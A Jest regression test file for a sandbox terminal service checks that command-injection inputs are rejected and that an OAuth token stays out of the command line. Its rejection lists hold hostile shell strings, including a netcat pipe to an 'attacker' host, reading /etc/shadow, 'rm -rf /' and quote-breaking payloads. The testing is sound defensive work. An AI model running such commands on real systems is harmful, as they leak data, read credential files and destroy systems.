/**
 * Terminal Service — SEC-01 regression tests
 *
 * Verifies that command-injection vectors against the sandbox tmux wrapper
 * (see services/sandbox/terminalService.js) are rejected before they reach
 * docker exec, and that the defense-in-depth shell-quoting helper never
 * emits an unquoted single-quote.
 */

jest.mock('../../src/database', () => ({
  query: jest.fn().mockResolvedValue({ rows: [{ id: 'session-1' }] }),
}));

jest.mock('../../src/services/core/docker', () => ({
  docker: { getContainer: jest.fn() },
}));

jest.mock('../../src/services/sandbox/sandboxService', () => ({
  getProject: jest.fn(),
}));

jest.mock('../../src/services/sandbox/externalCredentialsService', () => ({
  getCentralAuthEnv: jest.fn().mockResolvedValue({}),
}));

jest.mock('../../src/services/sandbox/claudeOauthService', () => ({
  ensureFreshToken: jest.fn().mockResolvedValue(false),
}));

const terminalService = require('../../src/services/sandbox/terminalService');
const sandboxService = require('../../src/services/sandbox/sandboxService');
const externalCredentialsService = require('../../src/services/sandbox/externalCredentialsService');
const { docker } = require('../../src/services/core/docker');
const { ALLOWED_SESSION_TYPES, CUSTOM_COMMAND_RE, shellSingleQuote } =
  terminalService._internals;

const mockWs = () => ({ readyState: 1, send: jest.fn(), on: jest.fn(), close: jest.fn() });

describe('terminalService — input validation', () => {
  describe('sessionType allowlist', () => {
    const allowed = ['shell', 'custom', 'claude-code', 'codex'];
    allowed.forEach(t => {
      test(`accepts "${t}"`, () => {
        expect(ALLOWED_SESSION_TYPES.has(t)).toBe(true);
      });
    });

    const rejected = [
      'bash',
      'sh',
      'CUSTOM',
      'shell; whoami',
      'shell\nwhoami',
      '',
      '__proto__',
    ];
    rejected.forEach(t => {
      test(`rejects "${t}"`, () => {
        expect(ALLOWED_SESSION_TYPES.has(t)).toBe(false);
      });
    });
  });

  describe('CUSTOM_COMMAND_RE', () => {
    const ok = ['claude', 'bash -l', 'python3', './run.sh', '/usr/bin/env'];
    ok.forEach(c => {
      test(`accepts ${JSON.stringify(c)}`, () => {
        expect(CUSTOM_COMMAND_RE.test(c)).toBe(true);
      });
    });

    const bad = [
      "sh'; whoami; #",
      'ls; cat /etc/shadow',
      'ls && rm -rf /',
      'ls | nc attacker 4444',
      '`whoami`',
      '$(whoami)',
      'bash\nwhoami',
      'sh\twhoami',
      'ls > /tmp/x',
      '"; whoami; "',
      'a'.repeat(201),
    ];
    bad.forEach(c => {
      test(`rejects ${JSON.stringify(c)}`, () => {
        expect(CUSTOM_COMMAND_RE.test(c)).toBe(false);
      });
    });
  });

  describe('shellSingleQuote', () => {
    test('wraps plain strings in single quotes', () => {
      expect(shellSingleQuote('claude')).toBe("'claude'");
    });

    test("escapes embedded single quotes as '\\''", () => {
      expect(shellSingleQuote("it's")).toBe("'it'\\''s'");
    });

    test('neutralises injection payloads by quoting', () => {
      const payload = "sh'; whoami; #";
      const quoted = shellSingleQuote(payload);
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
      // No bare `;` that would terminate a shell command outside of quotes
      const unquoted = quoted.slice(1, -1);
      // After unwrapping, all internal single quotes must appear as escaped sequence.
      expect(unquoted.replace(/'\\''/g, '')).not.toMatch(/'/);
    });
  });

  describe('createSession — rejects injection payloads', () => {
    beforeEach(() => {
      sandboxService.getProject.mockResolvedValue({
        container_status: 'running',
        container_id: 'c1',
      });
    });

    test('rejects unknown sessionType', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          sessionType: 'bash',
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger sessionType/);
      // Must fail before touching project lookup
      expect(sandboxService.getProject).not.toHaveBeenCalled();
    });

    test('rejects custom command with shell metacharacters', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          sessionType: 'custom',
          command: "sh'; whoami; #",
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger command/);
      expect(sandboxService.getProject).not.toHaveBeenCalled();
    });

    test('rejects custom command with newline', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          sessionType: 'custom',
          command: 'ls\nwhoami',
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger command/);
    });

    test('rejects custom sessionType without command', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          sessionType: 'custom',
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger command/);
    });

    test('rejects tmuxName with shell metacharacters (multi-session guard)', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          tmuxName: "main'; whoami; #",
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger tmux-Session-Name/);
      // Must fail before touching the project lookup
      expect(sandboxService.getProject).not.toHaveBeenCalled();
    });

    test('rejects overly long tmuxName', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          tmuxName: 'a'.repeat(41),
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger tmux-Session-Name/);
    });
  });

  describe('createSession — zentralen KI-Zugang sicher injizieren', () => {
    const SECRET = 'sk-ant-oat01-SUPERSECRETVALUE';
    let execMock;

    beforeEach(() => {
      jest.clearAllMocks();
      sandboxService.getProject.mockResolvedValue({
        container_status: 'running',
        container_id: 'c1',
      });
      const stream = { on: jest.fn(), pause: jest.fn(), resume: jest.fn() };
      execMock = jest.fn().mockResolvedValue({
        id: 'exec-1',
        start: jest.fn().mockResolvedValue(stream),
        resize: jest.fn(),
      });
      docker.getContainer.mockReturnValue({ exec: execMock });
    });

    async function runClaudeSession() {
      await terminalService.createSession('p1', mockWs(), {
        sessionType: 'claude-code',
        userId: 1,
      });
      return execMock.mock.calls[0][0]; // exec-Optionen (Cmd + Env)
    }

    test('OAuth-Token steckt in der exec-Env, aber NIE als Wert in der Kommandozeile', async () => {
      externalCredentialsService.getCentralAuthEnv.mockResolvedValue({
        CLAUDE_CODE_OAUTH_TOKEN: SECRET,
      });
      const opts = await runClaudeSession();
      // In der Env: ja.
      expect(opts.Env).toContain(`CLAUDE_CODE_OAUTH_TOKEN=${SECRET}`);
      // In der Kommandozeile (→ ps, DB-`command`): der WERT niemals.
      const cmdline = opts.Cmd.join(' ');
      expect(cmdline).not.toContain(SECRET);
      // Nur per Variablen-NAME referenziert.
      expect(cmdline).toContain('tmux setenv -g CLAUDE_CODE_OAUTH_TOKEN "$CLAUDE_CODE_OAUTH_TOKEN"');
    });

    test('bei Token-Modus wird ANTHROPIC_API_KEY komplett entfernt (unset)', async () => {
      externalCredentialsService.getCentralAuthEnv.mockResolvedValue({
        CLAUDE_CODE_OAUTH_TOKEN: SECRET,
      });
      const opts = await runClaudeSession();
      const cmdline = opts.Cmd.join(' ');
      expect(cmdline).toContain('unset ANTHROPIC_API_KEY');
      expect(cmdline).toContain('tmux setenv -gu ANTHROPIC_API_KEY');
      // Kein gesetzter API-Key in der Env.
      expect(opts.Env.some(e => e.startsWith('ANTHROPIC_API_KEY='))).toBe(false);
    });

    test('apikey-Modus setzt ANTHROPIC_API_KEY und entfernt ihn NICHT', async () => {
      externalCredentialsService.getCentralAuthEnv.mockResolvedValue({
        ANTHROPIC_API_KEY: 'sk-ant-APIKEY',
      });
      const opts = await runClaudeSession();
      expect(opts.Env).toContain('ANTHROPIC_API_KEY=sk-ant-APIKEY');
      expect(opts.Cmd.join(' ')).not.toContain('unset ANTHROPIC_API_KEY');
    });
  });
});
